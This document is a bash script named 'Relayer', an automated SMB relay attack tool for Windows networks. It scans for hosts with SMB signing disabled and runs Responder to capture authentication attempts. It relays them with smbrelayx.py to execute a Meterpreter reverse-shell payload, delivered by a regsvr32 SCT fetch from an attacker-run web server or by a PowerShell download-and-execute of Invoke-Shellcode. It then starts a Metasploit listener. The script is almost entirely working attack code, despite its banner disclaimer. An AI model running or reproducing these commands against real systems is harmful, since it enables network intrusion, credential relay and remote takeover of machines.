#!/bin/bash

# Relayer v1.0
# SMB Relay Script
#
# Jason Soto
# www.jasonsoto.com
# Twitter = @JsiTech

# Tool URL = github.com/jsitech/relayer
# Tested in Kali Linux

# Based from chuckle
# Credits to nccgroup

################################################################################


f_banner(){

echo
echo "

██████╗ ███████╗██╗      █████╗ ██╗   ██╗███████╗██████╗
██╔══██╗██╔════╝██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗
██████╔╝█████╗  ██║     ███████║ ╚████╔╝ █████╗  ██████╔╝
██╔══██╗██╔══╝  ██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗
██║  ██║███████╗███████╗██║  ██║   ██║   ███████╗██║  ██║
╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝

SMB Relay Script
By Jason Soto @jsitech

***************************************************************
* Running this tool without prior mutual consent is Illegal   *
* It is the END user responsibility to obey all applicable    *
* Laws. Author assume no liability and is not responsible for *
* any misuse of this tool.                                    *
***************************************************************
                               ||
                               ||
                        (\__/) ||
                        (•ㅅ•) ||
                        / 　 づ

"

echo
echo

}

################################################################################

spinner ()
{
    bar=" ++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    barlength=${#bar}
    i=0
    while ((i < 100)); do
        n=$((i*barlength / 100))
        printf "\e[00;34m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.02
    done
}

################################################################################
clear
f_banner

echo "Checking for dependencies"
spinner
clear

f_banner
for dependency in responder nmap smbrelayx.py msfconsole; do
  if [ `which $dependency 2>&1 | wc -l` -eq 0 ]; then
    echo "Missing Dependency $dependency, Please run install_req.sh before running relayer"
    missing=1
  fi
done

if [ "$missing" == 1 ]; then
   exit
fi

echo "Checking if Unicorn and Ps1encode are Present"
spinner

for dependency2 in unicorn ps1encode
do
   if [ -d $dependency2/ ]; then
     echo ""
     echo "$dependency2 Dir is Present, Moving on"
     sleep 0.02
   else
     echo ""
     echo "$dependency2 is not Present, Please run install_req.sh"
     missing2=1
  fi
done

if [ "$missing2" == 1 ]; then
   exit
fi

echo "Checking if Needed ports are Available"
spinner
clear
f_banner

for port in 21/tcp 25/tcp 53/tcp 80/tcp 110/tcp 139/tcp 1433/tcp 443/tcp 587/tcp 389/tcp 445/tcp 3141/tcp 53/udp 137/udp 138/udp 5553/udp; do
  if [ `fuser $port 2>&1 |wc -l` -gt 0 ]; then
    echo "port $port busy, please check"
    busy=1
  fi
done

if [ "$busy" == 1 ]; then
    exit
fi

echo "Please enter IP(s) or Network(s) separated by space to scan for SMB:" ; read network
for subnet in $network; do
    echo "$subnet"
done >> relayersubnet.txt
nmap -n -Pn -iL relayersubnet.txt -sS --script smb-security-mode.nse -p445 -oA relayer >>relayer.log &
echo "Scanning for SMB hosts and NETBIOS name...It may take a little while"
wait

for ip in $(grep open relayer.gnmap |cut -d ' ' -f 2 ); do
  hosts=$(grep -A 15 "for $ip$" relayer.nmap |grep disabled |wc -l)
  if [ $hosts -gt 0 ]; then
      nbtname=$(nbtscan  $ip | awk -F" " '{print $2}' | tail -1)
      echo "$ip($nbtname)" >> relayer.hosts
  fi
done

if [[ -s relayer.hosts ]] ; then
	echo "Select SMB Relay Target:"
	sed -i '/^$/d' relayer.hosts
        hosts=$(<relayer.hosts)
	select tmptarget in $hosts
	do
    target=$(echo ${tmptarget%\(*})
		echo "Authentication attempts will be relayed to $tmptarget"
		break
	done
else
	echo "No SMB hosts found."
	exit
fi

clear
f_banner
echo "What System do you want the Metasploit Listener to run on? Select 1 or 2 and press ENTER"
echo ""
echo -e "1. Use my current local ip address"
echo ""
echo -e "2. Use alternate system"
echo ""
read select
echo ""

if [ "$select" = "1" ]; then
  echo ""
  lhost=$(ip route get 1 | awk '{print $7;exit}')
  echo "Please enter local port for reverse connection:" ; read lport
  echo "Meterpreter shell will connect back to $lhost on port $lport"
elif [ "$select" = "2" ]; then
  echo ""
  echo "Alternative System Selected"
  echo ""
  echo "What IP address do you want the Listener to run on?"
  echo -ne ">"; read lhost
  echo ""
  echo "Please enter port for reverse connection"
  echo -ne ">"; read lport
fi

#Select Payload delivery method

echo "Select Payload Delivery Method"

select method in unicorn sct powersploit
do
    case $method in
      unicorn)
         echo "Generating Payload..."
         spinner
         metapayload=windows/meterpreter/reverse_tcp
         python unicorn/unicorn.py $metapayload $lhost $lport >> relayer.log
         payload=$(cat powershell_attack.txt)
         break
         ;;
      sct)
         echo "Generating sct file and launching HTTP Server on port 8080"
         spinner
         metapayload=windows/meterpreter/reverse_tcp
         cd ps1encode/
         sed -i '99c\    system("msfvenom -p #{$lpayload} LHOST=#{$lhost} LPORT=#{$lport} --arch x86 -e x86/shikata_ga_nai -b STRING --platform windows --smallest -f raw > raw_shellcode_temp")' ps1encode.rb
         sed -i s/STRING/"'\\\\\\\\\\{x00}'"/g ps1encode.rb
         sed -i s/{x00}/x00/g ps1encode.rb
         ./ps1encode.rb --PAYLOAD $metapayload --LHOST=$lhost --LPORT=$lport -t sct
         cd ..
         mkdir site
         cp ps1encode/index.sct site/index.sct
         cd site
         python -m SimpleHTTPServer 8080 >/dev/null 2>&1 &
         cd ..
         payload="regsvr32 /s /n /u /i:http://$lhost:8080/index.sct scrobj.dll"
         break
         ;;
      powersploit)
         echo "Creating Payload using powershell script from Powersploit"
         spinner
         metapayload=windows/meterpreter/reverse_https
         payload="Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode -Payload $metapayload -Lhost $lhost -Lport $lport -Force"
         break
         ;;
      *)
         echo "Error, Please select payload method"
         ;;
      esac
done

echo "Payload created"
echo "Starting SMBRelayX..."

smbrelayx.py -h $target -e "$payload"  >> relayer.log  &
sleep 2

echo ""

netstat -i | cut -d ' ' -f1 | sed 1,2d >> relayer.ifaces

echo "Enter Interface to run Responder"
echo "Showing available interfaces:"
echo ""
ifaces=$(<relayer.ifaces)
echo -e "$ifaces"
echo ""
echo -ne ">" ; read netiface
echo ""
echo "Starting Responder on $netiface..."
responder -I $netiface -wrfF >> relayer.log &


if [ "$select" = "1" ]; then
  echo ""
  echo "You Selected to run the Listener on this System"
  echo "Setting up the Listener"
  msfconsole -q -x "use exploit/multi/handler; set payload $metapayload; set LHOST $lhost; set LPORT $lport; set autorunscript post/windows/manage/migrate; exploit -j;"
elif [ "$select" = "2" ]; then
  echo ""
  echo "Use msfhandler.rc as msfconsole resource on your listener system"
  echo "use exploit/multi/handler" >> msfhandler.rc
  echo "set payload $metapayload" >> msfhandler.rc
  echo "set LHOST $lhost" >> msfhandler.rc
  echo "set LPORT $lport" >> msfhandler.rc
  echo "run" >> msfhandler.rc
  echo ""
  echo "Run msfconsole -r msfhandler.rc on your listener box"
fi


#Cleanup

rm relayer.hosts
rm relayer.ifaces
rm relayersubnet.txt
